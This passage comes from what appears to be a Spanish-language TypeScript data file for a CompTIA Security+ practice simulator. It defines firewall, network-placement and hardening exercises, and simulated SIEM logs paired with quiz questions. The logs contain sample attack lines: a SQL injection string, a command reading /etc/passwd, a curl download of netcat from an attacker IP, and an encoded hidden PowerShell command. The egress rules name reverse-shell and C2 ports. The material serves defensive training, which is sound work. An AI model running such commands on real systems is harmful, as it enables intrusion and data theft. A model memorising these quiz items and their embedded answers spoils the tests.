      'Una auditoría de cumplimiento regulatorio (SOC 2 Type II y PCI-DSS v4) identificó seis servicios corporativos críticos ejecutando protocolos legados en texto plano o configuraciones de acceso remoto deficientes. Como Lead Security Architect, debes auditar cada servicio, identificar el vector de riesgo exacto según el temario oficial de CompTIA Security+ SY0-701, determinar el puerto y protocolo seguro de reemplazo, y especificar el control técnico de hardening correspondiente.',
    requirements: [
      'Servicio 1: Routers y Switches Cisco de Core (Telnet TCP 23 & HTTP 80) -> Migrar a SSH TCP 22 y HTTPS TCP 443 con clave asimétrica y deshabilitar VTY telnet.',
      'Servicio 2: Directorio Activo y Autenticación Central (LDAP TCP 389) -> Migrar a LDAPS TCP 636 con TLS 1.3 y LDAP Channel Binding token signing.',
      'Servicio 3: Servidor de Finanzas y Nóminas Bancarias (FTP TCP 20/21 & TFTP UDP 69) -> Migrar a SFTP TCP 22 con autenticación por par de claves y cifrado AES-256.',
      'Servicio 4: Servidores de Resolución DNS Corporativos (DNS UDP 53 sin firmar) -> Implementar DNSSEC con registros RRSIG/DNSKEY y DoT (DNS over TLS) en TCP 853.',
      'Servicio 5: Monitoreo y Telemetría de Infraestructura (SNMPv1/v2c UDP 161 en claro) -> Migrar a SNMPv3 modo authPriv (SHA-256 y AES) en UDP 161.',
      'Servicio 6: Administración de Servidores y Escritorios Remotos (VNC TCP 5900 y RDP 3389 expuesto) -> Deshabilitar VNC 5900, forzar RDP con NLA sobre TLS 3389 vía Bastion Host con MFA.'
    ],
    tacticalTip:
      'CyberKraft Tip: CompTIA evalúa la correspondencia directa de protocolos en casi todos los exámenes: Telnet(23)->SSH(22), HTTP(80)->HTTPS(443), LDAP(389)->LDAPS(636), FTP(20/21)->SFTP(22) o FTPS(989/990), SNMPv1/v2(161)->SNMPv3(161 authPriv), y DNS(53)->DNSSEC/DoT(853). Recuerda que SNMPv3 es el ÚNICO que cifra las transferencias usando el modelo USM (User-based Security Model) con autenticación SHA y privacidad AES.'
  }
];


// ========================================================
// DATASETS ESPECÍFICOS PARA CADA PBQ
// ========================================================

// --------------------------------------------------------
// PBQ 1: Network Controls (Perímetro Tradicional)
// --------------------------------------------------------
export const AVAILABLE_NETWORK_CONTROLS_PBQ1: NetworkControlItem[] = [
  {
    id: 'waf',
    name: 'Web Application Firewall',
    acronym: 'WAF',
    layer: 'Capa 7 (Aplicación)',
    description: 'Inspecciona tráfico HTTP/HTTPS, mitiga inyecciones SQL, XSS, CSRF y ataques OWASP Top 10.',
    iconType: 'ShieldAlert'
  },
  {
    id: 'inline_ips',
    name: 'Inline Intrusion Prevention System',
    acronym: 'IPS',
    layer: 'Capa 3 - 7 (En Línea)',
    description: 'Inspecciona paquetes en tiempo real y bloquea activamente firmas de ataques y anomalías.',
    iconType: 'Shield'
  },
  {
    id: 'passive_ids',
    name: 'Passive Intrusion Detection',
    acronym: 'IDS',
    layer: 'Capa 3 - 4 (Fuera de banda)',
    description: 'Recibe copia de tráfico (puerto SPAN/TAP) y genera alertas sin bloquear activamente.',
    iconType: 'Eye'
  },
  {
    id: 'stateful_fw',
    name: 'Stateful Boundary Firewall',
    acronym: 'FW',
    layer: 'Capa 3 - 4 (Estado)',
    description: 'Monitorea el estado de conexiones y controla el tráfico entre zonas de seguridad (DMZ a LAN).',
    iconType: 'Layers'
  },
  {
    id: 'load_balancer',
    name: 'Load Balancer / Reverse Proxy',
    acronym: 'LB',
    layer: 'Capa 4 - 7 (Distribución)',
    description: 'Distribuye la carga entre los servidores web y puede realizar descarga SSL/TLS.',
    iconType: 'Network'
  },
  {
    id: 'bastion_host',
    name: 'Bastion Host / Jump Server',
    acronym: 'JUMP',
    layer: 'Capa 7 (Acceso Seguro)',
    description: 'Servidor endurecido único para que los administradores inicien sesiones SSH/RDP seguras.',
    iconType: 'Server'
  },
  {
    id: 'radius_server',
    name: 'Servidor RADIUS (AAA)',
    acronym: 'RADIUS',
    layer: 'Capa 7 (Autenticación)',
    description: 'Servidor centralizado de autenticación, autorización y contabilidad (AAA / 802.1X).',
    iconType: 'Key'
  }
];

export const INITIAL_NETWORK_SLOTS_PBQ1: NetworkZoneSlot[] = [
  {
    slotId: 'slot-edge',
    zone: 'perimeter',
    title: 'Posición A: Borde Internet ⟶ Red corporativa',
    currentPlacedId: null,
    allowedRoleHint: 'Inspección y mitigación activa de ataques antes de ingresar a la red'
  },
  {
    slotId: 'slot-dmz-front',
    zone: 'dmz_front',
    title: 'Posición B: Entrada a la DMZ (delante de los servidores web)',
    currentPlacedId: null,
    allowedRoleHint: 'Inspección profunda de peticiones HTTP/HTTPS hacia Web Servers'
  },
  {
    slotId: 'slot-boundary',
    zone: 'boundary',
    title: 'Posición C: Frontera DMZ ⟷ LAN interna',
    currentPlacedId: null,
    allowedRoleHint: 'Aislamiento estricto y control de estado entre DMZ y LAN interna'
  },
  {
    slotId: 'slot-mgmt',
    zone: 'mgmt',
    title: 'Posición D: Segmento de administración',
    currentPlacedId: null,
    allowedRoleHint: 'Punto único de acceso endurecido para mantenimiento de sistemas'
  },
  {
    slotId: 'slot-lan-auth',
    zone: 'lan_core',
    title: 'Posición E: Core de la LAN interna',
    currentPlacedId: null,
    allowedRoleHint: 'Servidor interno de autenticación de identidades corporativas'
  }
];

// Alias for backwards compatibility
export const AVAILABLE_NETWORK_CONTROLS = AVAILABLE_NETWORK_CONTROLS_PBQ1;
export const INITIAL_NETWORK_SLOTS = INITIAL_NETWORK_SLOTS_PBQ1;

// --------------------------------------------------------
// PBQ 8: Network Controls (Cloud Híbrida & Zero Trust)
// --------------------------------------------------------
export const AVAILABLE_NETWORK_CONTROLS_PBQ8: NetworkControlItem[] = [
  {
    id: 'cloud_waf',
    name: 'Cloud WAF & DDoS Shield',
    acronym: 'CLOUD-WAF',
    layer: 'Capa 7 (Cloud Edge)',
    description: 'Inspección perimetral elástica contra inyecciones SQL, botnets y mitigación DDoS Capa 7.',
    iconType: 'ShieldAlert'
  },
  {
    id: 'transit_gw',
    name: 'Transit Gateway (TGW / IPSec)',
    acronym: 'TGW',
    layer: 'Capa 3 (Híbrido)',
    description: 'Concentrador centralizado de túneles VPN IPSec y conexiones Direct Connect entre Cloud y On-Prem.',
    iconType: 'Network'
  },
  {
    id: 'ztna_broker',
    name: 'Zero Trust Network Access Broker',
    acronym: 'ZTNA',
    layer: 'Capa 7 (Identidad)',
    description: 'Aplica políticas de verificación continua y mínimo privilegio a nivel de aplicación sin exponer la red.',
    iconType: 'Shield'
  },
  {
    id: 'ngfw_onprem',
    name: 'Next-Gen Firewall (NGFW On-Prem)',
    acronym: 'NGFW',
    layer: 'Capa 3 - 7 (Data Center)',
    description: 'Inspección profunda de paquetes con prevención de intrusiones en el centro de datos local.',
    iconType: 'Layers'
  },
  {
    id: 'idp_adfs',
    name: 'Identity Provider (ADFS / SAML)',
    acronym: 'IDP/ADFS',
    layer: 'Capa 7 (Directorio)',
    description: 'Servidor de identidades federadas con tokens SAML/OIDC ubicado en el centro de datos protegido.',
    iconType: 'Key'
  },
  {
    id: 'public_lb',
    name: 'Application Load Balancer (ALB)',
    acronym: 'ALB',
    layer: 'Capa 7 (Ingress)',
    description: 'Distribuidor de tráfico HTTP/HTTPS hacia instancias de microservicios en subred privada.',
    iconType: 'Server'
  }
];

export const INITIAL_NETWORK_SLOTS_PBQ8: NetworkZoneSlot[] = [
  {
    slotId: 'slot-cloud-edge',
    zone: 'cloud_edge',
    title: 'Posición A: Borde de la VPC (Internet ⟶ Cloud)',
    currentPlacedId: null,
    allowedRoleHint: 'Inspección de aplicaciones web y escudo anti-DDoS antes de ingresar a la VPC'
  },
  {
    slotId: 'slot-cloud-transit',
    zone: 'cloud_transit',
    title: 'Posición B: Enlace VPC ⟷ Data Center',
    currentPlacedId: null,
    allowedRoleHint: 'Punto de interconexión central cifrada entre VPC Cloud y Data Center On-Prem'
  },
  {
    slotId: 'slot-cloud-ztna',
    zone: 'cloud_priv',
    title: 'Posición C: Acceso de ingenieros DevOps remotos',
    currentPlacedId: null,
    allowedRoleHint: 'Broker de acceso contextual para administradores sin acceso a toda la red'
  },
  {
    slotId: 'slot-onprem-edge',
    zone: 'onprem_edge',
    title: 'Posición D: Perímetro del Data Center on-prem',
    currentPlacedId: null,
    allowedRoleHint: 'Next-Gen Firewall para inspeccionar el tráfico procedente del enlace híbrido'
  },
  {
    slotId: 'slot-onprem-idp',
    zone: 'onprem_core',
    title: 'Posición E: Servicio de identidad corporativo',
    currentPlacedId: null,
    allowedRoleHint: 'Servicio de autenticación corporativa interna para federación Cloud'
  }
];

// --------------------------------------------------------
// PBQ 2: Firewall ACL Inbound
// --------------------------------------------------------
export const INITIAL_FIREWALL_RULES_PBQ2: FirewallRule[] = [
  {
    id: 'rule-1',
    ruleNumber: 10,
    action: 'PERMIT',
    protocol: 'TCP',
    sourceIp: '0.0.0.0/0',
    sourcePort: 'ANY',
    destIp: '192.168.1.10',
    destPort: '22',
    description: 'Administración SSH remota desde Internet',
    enabled: true
  },
  {
    id: 'rule-2',
    ruleNumber: 20,
    action: 'DENY',
    protocol: 'ANY',
    sourceIp: '0.0.0.0/0',
    sourcePort: 'ANY',
    destIp: '0.0.0.0/0',
    destPort: 'ANY',
    description: 'Bloqueo general prematuro (ORDEN ERRÓNEO)',
    enabled: true
  },
  {
    id: 'rule-3',
    ruleNumber: 30,
    action: 'PERMIT',
    protocol: 'TCP',
    sourceIp: '0.0.0.0/0',
    sourcePort: 'ANY',
    destIp: '192.168.2.10',
    destPort: '443',
    description: 'Permitir HTTPS público hacia servidor web DMZ',
    enabled: true
  },
  {
    id: 'rule-4',
    ruleNumber: 40,
    action: 'PERMIT',
    protocol: 'UDP',
    sourceIp: '0.0.0.0/0',
    sourcePort: 'ANY',
    destIp: '192.168.2.53',
    destPort: '53',
    description: 'Permitir consultas DNS públicas hacia servidor DNS DMZ',
    enabled: true
  },
  {
    id: 'rule-5',
    ruleNumber: 50,
    action: 'PERMIT',
    protocol: 'TCP',
    sourceIp: '0.0.0.0/0',
    sourcePort: 'ANY',
    destIp: '192.168.2.10',
    destPort: '80',
    description: 'Permitir HTTP en texto plano',
    enabled: true
  }
];

export const FIREWALL_PACKET_TESTS_PBQ2: FirewallPacketTest[] = [
  {
    id: 'test-1',
    name: 'Admin SSH desde Subred Autorizada (10.1.0.15)',
    sourceIp: '10.1.0.15',
    protocol: 'TCP',
    destIp: '192.168.1.10',
    destPort: '22',
    expectedAction: 'PERMIT',
    description: 'Debe permitirse SSH únicamente desde la subred administrativa 10.1.0.0/24'
  },
  {
    id: 'test-2',
    name: 'Intento de SSH externo desde Internet (198.51.100.99)',
    sourceIp: '198.51.100.99',
    protocol: 'TCP',
    destIp: '192.168.1.10',
    destPort: '22',
    expectedAction: 'DENY',
    description: 'Cualquier IP fuera de la subred de administración debe ser bloqueada'
  },
  {
    id: 'test-3',
    name: 'Tráfico Web HTTPS de cliente público (203.0.113.4)',
    sourceIp: '203.0.113.4',
    protocol: 'TCP',
    destIp: '192.168.2.10',
    destPort: '443',
    expectedAction: 'PERMIT',
    description: 'El servidor web DMZ debe aceptar conexiones HTTPS seguras'
  },
  {
    id: 'test-4',
    name: 'Consulta DNS externa a DNS DMZ (203.0.113.88)',
    sourceIp: '203.0.113.88',
    protocol: 'UDP',
    destIp: '192.168.2.53',
    destPort: '53',
    expectedAction: 'PERMIT',
    description: 'El servidor DNS DMZ debe resolver consultas UDP 53'
  },
  {
    id: 'test-5',
    name: 'Tráfico no deseado Telnet (Puerto 23)',
    sourceIp: '198.51.100.4',
    protocol: 'TCP',
    destIp: '192.168.1.10',
    destPort: '23',
    expectedAction: 'DENY',
    description: 'El protocolo Telnet en texto plano debe ser denegado por la regla implícita'
  }
];

export const INITIAL_FIREWALL_RULES = INITIAL_FIREWALL_RULES_PBQ2;
export const FIREWALL_PACKET_TESTS = FIREWALL_PACKET_TESTS_PBQ2;

// --------------------------------------------------------
// PBQ 9: Firewall ACL Egress (Filtrado de Salida & Anti-Exfiltración)
// --------------------------------------------------------
export const INITIAL_FIREWALL_RULES_PBQ9: FirewallRule[] = [
  {
    id: 'egress-1',
    ruleNumber: 10,
    action: 'PERMIT',
    protocol: 'UDP',
    sourceIp: '10.2.0.0/24',
    sourcePort: 'ANY',
    destIp: '0.0.0.0/0',
    destPort: '53',
    description: 'DNS saliente sin restricción (VULNERABLE A TUNNELING)',
    enabled: true
  },
  {
    id: 'egress-2',
    ruleNumber: 20,
    action: 'PERMIT',
    protocol: 'TCP',
    sourceIp: '10.2.0.0/24',
    sourcePort: 'ANY',
    destIp: '0.0.0.0/0',
    destPort: '4444',
    description: 'Puerto arbitrario abierto (PUERTO DE REVERSE SHELL)',
    enabled: true
  },
  {
    id: 'egress-3',
    ruleNumber: 30,
    action: 'PERMIT',
    protocol: 'TCP',
    sourceIp: '10.2.0.0/24',
    sourcePort: 'ANY',
    destIp: '0.0.0.0/0',
    destPort: '6667',
    description: 'Tráfico saliente IRC (CANAL CLÁSICO C2 BOTNET)',
    enabled: true
  },
  {
    id: 'egress-4',
    ruleNumber: 40,
    action: 'PERMIT',
    protocol: 'TCP',
    sourceIp: '10.2.0.0/24',
    sourcePort: 'ANY',
    destIp: '0.0.0.0/0',
    destPort: '443',
    description: 'Permitir tráfico web HTTPS legítimo hacia Internet',
    enabled: true
  }
];

export const FIREWALL_PACKET_TESTS_PBQ9: FirewallPacketTest[] = [
  {
    id: 'egress-test-1',
    name: 'Consulta DNS legítima a resolvedor interno (10.0.0.53)',
    sourceIp: '10.2.0.88',
    protocol: 'UDP',
    destIp: '10.0.0.53',
    destPort: '53',
    expectedAction: 'PERMIT',
    description: 'El DNS interno corporativo debe poder ser consultado por clientes internos'
  },
  {
    id: 'egress-test-2',
    name: 'Exfiltración DNS Tunneling a DNS externo no autorizado (198.51.100.200)',
    sourceIp: '10.2.0.88',
    protocol: 'UDP',
    destIp: '198.51.100.200',
    destPort: '53',
    expectedAction: 'DENY',
    description: 'Consultas DNS directas a Internet deben bloquearse para frenar exfiltración por túneles DNS'
  },
  {
    id: 'egress-test-3',
    name: 'Conexión Reverse Shell saliente hacia atacante (203.0.113.99:4444)',
    sourceIp: '10.2.0.88',
    protocol: 'TCP',
    destIp: '203.0.113.99',
    destPort: '4444',
    expectedAction: 'DENY',
    description: 'Puertos arbitrarios como 4444 deben estar estrictamente bloqueados en salida'
  },
  {
    id: 'egress-test-4',
    name: 'Conexión a servidor C2 por puerto IRC (198.51.100.4:6667)',
    sourceIp: '10.2.0.88',
    protocol: 'TCP',
    destIp: '198.51.100.4',
    destPort: '6667',
    expectedAction: 'DENY',
    description: 'Puertos de IRC (6667) deben ser denegados por directiva Egress'
  },
  {
    id: 'egress-test-5',
    name: 'Navegación Web segura saliente HTTPS (104.16.12.3:443)',
    sourceIp: '10.2.0.88',
    protocol: 'TCP',
    destIp: '104.16.12.3',
    destPort: '443',
    expectedAction: 'PERMIT',
    description: 'Tráfico web saliente HTTPS estándar debe permitirse a los usuarios'
  }
];

// --------------------------------------------------------
// PBQ 3: SIEM Logs (SQLi & Web Shell)
// --------------------------------------------------------
export const SIEM_LOGS_PBQ3: SiemLogEntry[] = [
  {
    id: 'log-01',
    timestamp: '2026-10-18 14:18:02',
    source: 'Firewall',
    level: 'INFO',
    sourceIp: '198.51.100.42',
    destIp: '192.168.1.105',
    eventSummary: 'Conexión entrante TCP aceptada puerto 443 (HTTPS)',
    rawPayload: 'SRC=198.51.100.42 DST=192.168.1.105 PROTO=TCP SPT=54210 DPT=443 SYN ACTION=ALLOW'
  },
  {
    id: 'log-02',
    timestamp: '2026-10-18 14:20:11',
    source: 'Apache',
    level: 'WARN',
    sourceIp: '198.51.100.42',
    destIp: '192.168.1.105',
    eventSummary: 'Petición anómala con caracteres SQL en parámetro id',
    rawPayload: '198.51.100.42 - - [18/Oct/2026:14:20:11 +0000] "GET /catalog/item.php?id=1%27%20OR%201=1-- HTTP/1.1" 200 8432'
  },
  {
    id: 'log-03',
    timestamp: '2026-10-18 14:22:15',
    source: 'Apache',
    level: 'ALERT',
    sourceIp: '198.51.100.42',
    destIp: '192.168.1.105',
    eventSummary: 'Explotación SQLi y subida de archivo ejecutable web shell (cmd.php)',
    rawPayload: '198.51.100.42 - - [18/Oct/2026:14:22:15 +0000] "POST /uploads/profile_avatar.php?action=upload HTTP/1.1" 200 412 [Payload: cmd.php (PHP Shell Execution)]'
  },
  {
    id: 'log-04',
    timestamp: '2026-10-18 14:24:30',
    source: 'Syslog',
    level: 'ERROR',
    sourceIp: '192.168.1.105',
    destIp: '192.168.1.105',
    eventSummary: 'Proceso web apache/www-data ejecutó comando shell interactivo /bin/bash',
    rawPayload: 'Oct 18 14:24:30 web-srv01 auditd[1104]: type=EXECVE msg=audit(1760807070.102): argc=3 a0="sh" a1="-c" a2="whoami; id; cat /etc/passwd"'
  },
  {
    id: 'log-05',
    timestamp: '2026-10-18 14:27:08',
    source: 'Syslog',
    level: 'ALERT',
    sourceIp: '192.168.1.105',
    destIp: '198.51.100.42',
    eventSummary: 'Descarga de cradle PowerShell malicioso y utilidad de escaneo de red',
    rawPayload: 'Oct 18 14:27:08 web-srv01 EDR-Agent: Detected outbound curl http://198.51.100.42/tools/nc.bin -> /tmp/netcat'
  },
  {
    id: 'log-06',
    timestamp: '2026-10-18 14:29:45',
    source: 'WinEvent',
    level: 'WARN',
    sourceIp: '192.168.1.105',
    destIp: '192.168.1.200',
    eventSummary: 'Event ID 4625: Inicio de sesión fallido de cuenta Administrador',
    rawPayload: 'EventID=4625 SourceNetworkAddress=192.168.1.105 TargetUserName=Administrator FailureReason=Unknown username or bad password WorkstationName=WEB-SRV01'
  },
  {
    id: 'log-07',
    timestamp: '2026-10-18 14:31:02',
    source: 'WinEvent',
    level: 'ALERT',
    sourceIp: '192.168.1.105',
    destIp: '192.168.1.200',
    eventSummary: 'Event ID 4624: Inicio de sesión exitoso con credenciales privilegiadas (Pass-the-Hash)',
    rawPayload: 'EventID=4624 SourceNetworkAddress=192.168.1.105 TargetUserName=svc_backup LogonType=3 (Network) AuthenticationPackage=NTLM'
  },
  {
    id: 'log-08',
    timestamp: '2026-10-18 14:33:50',
    source: 'Firewall',
    level: 'ERROR',
    sourceIp: '192.168.1.105',
    destIp: '192.168.1.0/24',
    eventSummary: 'Barrido masivo de puertos internos SMB (TCP/445) - Movimiento Lateral',
    rawPayload: 'SRC=192.168.1.105 DST=192.168.1.110,120,130,200 PROTO=TCP DPT=445 SYN_SCAN ALERT=PORT_SWEEP'
  }
];

export const SIEM_LOGS = SIEM_LOGS_PBQ3;

// --------------------------------------------------------
// PBQ 10: SIEM Logs (Phishing, C2 Beaconing & Kerberoasting)
// --------------------------------------------------------
export const SIEM_LOGS_PBQ10: SiemLogEntry[] = [
  {
    id: 'log10-01',
    timestamp: '2026-10-19 09:12:04',
    source: 'EmailGateway',
    level: 'ALERT',
    sourceIp: '185.220.101.5',
    destIp: '10.0.1.25',
    eventSummary: 'Correo de Phishing detectado: Suplantación de identidad del CEO con adjunto Invoice.iso',
    rawPayload: 'From: "CEO Office" <ceo@external-spoof.com> To: carlos.finanzas@corp.com SPF=softfail DKIM=none DMARC=fail Attachment=Invoice_Q3.iso'
  },
  {
    id: 'log10-02',
    timestamp: '2026-10-19 09:15:22',
    source: 'Syslog',
    level: 'ERROR',
    sourceIp: '10.0.1.25',
    destIp: '10.0.1.25',
    eventSummary: 'Montaje de archivo ISO y ejecución sospechosa de script VBScript camuflado',
    rawPayload: 'EDR-Proc: Parent=explorer.exe Child=wscript.exe CommandLine="wscript.exe C:\\Users\\carlos\\AppData\\Local\\Temp\\Invoice.vbs"'
  },
  {
    id: 'log10-03',
    timestamp: '2026-10-19 09:16:01',
    source: 'Syslog',
    level: 'ALERT',
    sourceIp: '10.0.1.25',
    destIp: '10.0.1.25',
    eventSummary: 'Ejecución de PowerShell oculto con bypass de execution policy y payload codificado en Base64',
    rawPayload: 'powershell.exe -w hidden -ep bypass -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAA...'
  },
  {
    id: 'log10-04',
    timestamp: '2026-10-19 09:17:00',
    source: 'Proxy',
    level: 'WARN',
    sourceIp: '10.0.1.25',
    destIp: '198.51.100.77',
    eventSummary: 'Balizamiento C2 (Beaconing) recurrente cada 60 segundos hacia dominio DGA sospechoso',
    rawPayload: 'GET http://dga-sync-telemetry-9912.xyz/heartbeat HTTP/1.1 Interval=60s Jitter=5% UserAgent=Mozilla/5.0'
  },
  {
    id: 'log10-05',
    timestamp: '2026-10-19 09:18:00',
    source: 'Proxy',
    level: 'WARN',
    sourceIp: '10.0.1.25',
    destIp: '198.51.100.77',
    eventSummary: 'Segundo latido C2 (Beaconing) confirmado en intervalo exacto de 60 segundos',
    rawPayload: 'GET http://dga-sync-telemetry-9912.xyz/heartbeat HTTP/1.1 Interval=60s Jitter=5% Status=200 OK'
  },
  {
    id: 'log10-06',
    timestamp: '2026-10-19 09:22:45',
    source: 'WinEvent',
    level: 'ALERT',
    sourceIp: '10.0.1.25',
    destIp: '10.0.0.10',
    eventSummary: 'Event ID 4769: Petición anómala de Ticket de Servicio Kerberos (TGS) con cifrado débil RC4 (Kerberoasting)',
    rawPayload: 'EventID=4769 ServiceName=MSSQL_Svc/sqlcluster.corp.local ClientAddress=::ffff:10.0.1.25 TicketOptions=0x40810000 TicketEncryptionType=0x17 (RC4-HMAC)'
  },
  {
    id: 'log10-07',
    timestamp: '2026-10-19 09:25:10',
    source: 'Syslog',
    level: 'ERROR',
    sourceIp: '10.0.1.25',
    destIp: '10.0.1.25',
    eventSummary: 'Inyección de memoria en proceso LSASS detectada por EDR (Mimikatz Sekurlsa::LogonPasswords)',
    rawPayload: 'EDR-Threat: Process lsass.exe accessed with PROCESS_VM_READ by unverified binary rundll32.exe Signature=HackTool.Win64.Mimikatz'
  }
];

export const SIEM_QUESTIONS_PBQ3: SiemQuestionsConfig = {
  q1Label: '1. Dirección IP del "Paciente Cero" Interno (Primer Host Comprometido):',
  q1Options: [
    { value: '198.51.100.42', label: '198.51.100.42 (IP del Atacante Externo)' },
    { value: '192.168.1.105', label: '192.168.1.105 (Servidor Web Interno Apache)' },
    { value: '192.168.1.200', label: '192.168.1.200 (Servidor de Base de Datos y Backups)' },
    { value: '192.168.1.110', label: '192.168.1.110 (Controlador de Dominio)' }
  ],
  q2Label: '2. Timestamp Exacto de la Explotación Inicial (Subida de Web Shell):',
  q2Options: [
    { value: '2026-10-18 14:18:02', label: '2026-10-18 14:18:02 (Conexión TCP inicial)' },
    { value: '2026-10-18 14:20:11', label: '2026-10-18 14:20:11 (Sondeo SQL injection en item.php)' },
    { value: '2026-10-18 14:22:15', label: '2026-10-18 14:22:15 (POST Exitoso y Carga de Web Shell cmd.php)' },
    { value: '2026-10-18 14:31:02', label: '2026-10-18 14:31:02 (Event 4624 Logon Exitoso en 192.168.1.200)' }
  ],
  q3Label: '3. Cadena de Ataque Reconstruida (Attack Vector Sequence):',
  q3Options: [
    {
      value: 'phishing_ransomware',
      label: 'Campaña de Phishing por correo ➔ Descarga de macro Office ➔ Cifrado Ransomware'
    },
    {
      value: 'sqli_rce_smb',
      label: 'Inyección SQL en Apache ➔ Carga de Web Shell (RCE) ➔ Robo de Credenciales ➔ Movimiento Lateral vía SMB (445)'
    },
    {
      value: 'ddos_syn_flood',
      label: 'Ataque de Denegación de Servicio (SYN Flood) ➔ Caída de Firewall perimetral ➔ Exfiltración DNS'
    },
    {
      value: 'bruteforce_rdp',
      label: 'Fuerza bruta contra RDP (Puerto 3389) ➔ Escalada local de privilegios ➔ Borrado de logs'
    }
  ],
  q4Label: '4. Acción Inmediata de Contención según el Ciclo de Incidentes NIST SP 800-61 / CompTIA:',
  q4Options: [
    {
      value: 'power_off_immediately',
      label: 'Apagar el servidor bruscamente de la corriente eléctrica de inmediato'
    },
    {
      value: 'isolate_host_network',
      label: 'Aislar de la red el host 192.168.1.105 (Desconectar interfaz/VLAN de cuarentena) preservando la memoria RAM para análisis forense'
    },
    {
      value: 'format_reinstall',
      label: 'Formatear y reinstalar el sistema operativo de inmediato sin extraer evidencia'
    },
    {
      value: 'email_attacker',
      label: 'Enviar correo de advertencia a la dirección IP pública del atacante'
    }
  ]
};

export const SIEM_QUESTIONS_PBQ10: SiemQuestionsConfig = {
  q1Label: '1. Causa Raíz de Entrada en el Gateway de Correo Electrónico:',
  q1Options: [
    { value: 'dmarc_fail_spoof', label: 'Correo de Phishing con remitente falsificado que falló autenticación SPF/DKIM y directiva DMARC=fail' },
    { value: 'zero_day_pdf', label: 'Vulnerabilidad Zero-Day en visor PDF embebido sin alertar antivirus' },
    { value: 'mitm_tls', label: 'Ataque Man-in-the-Middle en el canal SMTP TLS' },
    { value: 'ddos_mx', label: 'Saturación por denegación de servicio en el registro MX' }
  ],
  q2Label: '2. Técnica de Comunicación C2 y Persistencia Detectada en el Proxy:',
  q2Options: [
    { value: 'c2_beaconing_60s', label: 'Balizamiento periódico (C2 Beaconing) con temporizador regular de 60 segundos hacia dominio DGA malicioso' },
    { value: 'exfiltration_dns', label: 'Túnel encubierto por ICMP Ping flood' },
    { value: 'tor_onion', label: 'Enrutamiento anónimo Onion a través de nodos de salida Tor' },
    { value: 'p2p_torrent', label: 'Protocolo BitTorrent distribuido' }
  ],
  q3Label: '3. Tipo de Ataque a Active Directory Registrado en el Event ID 4769:',
  q3Options: [
    { value: 'kerberoasting_rc4', label: 'Kerberoasting: Solicitud de Ticket TGS para MSSQL_Svc con cifrado débil RC4 (0x17) para crackeo offline' },
    { value: 'golden_ticket', label: 'Golden Ticket: Falsificación completa de Ticket TGT con hash krbtgt' },
    { value: 'pass_the_ticket', label: 'Inyección de ticket en memoria Pass-the-Ticket' },
    { value: 'ldap_injection', label: 'Inyección LDAP contra el catálogo global' }
  ],
  q4Label: '4. Acción Táctica de Contención y Remediación en Directorio Activo:',
  q4Options: [
    { value: 'isolate_and_reset_svc_aes', label: 'Aislar estación 10.0.1.25, rotar clave de cuenta MSSQL_Svc exigiendo AES-256 e investigar procesos en RAM' },
    { value: 'reboot_domain_controller', label: 'Reiniciar inmediatamente todos los controladores de dominio' },
    { value: 'delete_active_directory', label: 'Eliminar el bosque de Active Directory y crear uno nuevo' },
    { value: 'unplug_internet', label: 'Desconectar la fibra óptica de toda la empresa' }
  ]
};

// --------------------------------------------------------
// PBQ 4: Endpoint Hardening (Server Web Baseline)
// --------------------------------------------------------
export const INITIAL_SERVICES_PBQ4: ServiceItem[] = [
  {
    id: 'svc-telnet',
    name: 'Telnet Service',
    port: 23,
    protocol: 'TCP',
    currentStatus: 'running',
    targetStatus: 'stopped',
    description: 'Protocolo de emulación de terminal obsoleto. Transmite credenciales en texto plano sin cifrado.',
    isVulnerable: true
  },
  {
    id: 'svc-ftp',
    name: 'FTP Service',
    port: 21,
    protocol: 'TCP',
    currentStatus: 'running',
    targetStatus: 'stopped',
    description: 'Transferencia de archivos clásica en texto claro. Vulnerable a sniffing y MITM.',
    isVulnerable: true
  },
  {
    id: 'svc-smbv1',
    name: 'SMBv1 File Sharing',
    port: 445,
    protocol: 'TCP',
    currentStatus: 'running',
    targetStatus: 'stopped',
    description: 'Protocolo vulnerable a exploits de ejecución remota (EternalBlue / WannaCry).',
    isVulnerable: true
  },
  {
    id: 'svc-ssh',
    name: 'SSH / SFTP Secure Daemon',
    port: 22,
    protocol: 'TCP',
    currentStatus: 'stopped',
    targetStatus: 'running',
    description: 'Canal seguro cifrado para gestión de consola y transferencia segura de archivos (SFTP).',
    isVulnerable: false
  },
  {
    id: 'svc-https',
    name: 'Web Server HTTPS (TLS 1.3)',
    port: 443,
    protocol: 'TCP',
    currentStatus: 'running',
    targetStatus: 'running',
    description: 'Servicio web seguro con cifrado de capa de transporte moderno.',
    isVulnerable: false
  }
];

export const INITIAL_SECURITY_POLICIES_PBQ4: SecurityPolicyItem[] = [
  {
    id: 'policy-uac',
    name: 'Control de Cuentas de Usuario (UAC)',
    type: 'toggle',
    currentValue: false,
    targetValue: true,
    description: 'Previene elevación no autorizada de privilegios por malware solicitando confirmación al administrador.'
  },
  {
    id: 'policy-pwd-len',
    name: 'Longitud Mínima de Contraseña',
    type: 'number_slider',
    currentValue: 8,
    targetValue: 14,
    unit: 'caracteres',
    min: 6,
    max: 20,
    step: 1,
    description: 'NIST SP 800-63B y CompTIA SY0-701 recomiendan un mínimo de 14 caracteres para cuentas corporativas.'
  },
  {
    id: 'policy-lockout',
    name: 'Umbral de Bloqueo de Cuenta (Account Lockout)',
    type: 'select',
    currentValue: 0,
    targetValue: 5,
    options: [
      { value: 0, label: 'Deshabilitado (0 intentos)' },
      { value: 3, label: '3 intentos fallidos' },
      { value: 5, label: '5 intentos fallidos' },
      { value: 10, label: '10 intentos fallidos' }
    ],
    description: 'Bloquea la cuenta temporalmente para mitigar ataques de contraseña automatizados por fuerza bruta.'
  },
  {
    id: 'policy-rdp-nla',
    name: 'Requerir Autenticación a Nivel de Red (RDP NLA)',
    type: 'toggle',
    currentValue: false,
    targetValue: true,
    description: 'Exige autenticación del usuario antes de que se establezca la sesión RDP completa, mitigando exploits de RDP.'
  }
];

export const INITIAL_SERVICES = INITIAL_SERVICES_PBQ4;
export const INITIAL_SECURITY_POLICIES = INITIAL_SECURITY_POLICIES_PBQ4;

// --------------------------------------------------------
// PBQ 11: Endpoint Hardening (Workstations: LLMNR, Cred Guard & Macros)
// --------------------------------------------------------
export const INITIAL_SERVICES_PBQ11: ServiceItem[] = [
  {
    id: 'svc-llmnr',
    name: 'LLMNR Name Resolution',
    port: 5355,
    protocol: 'UDP',
    currentStatus: 'running',
    targetStatus: 'stopped',
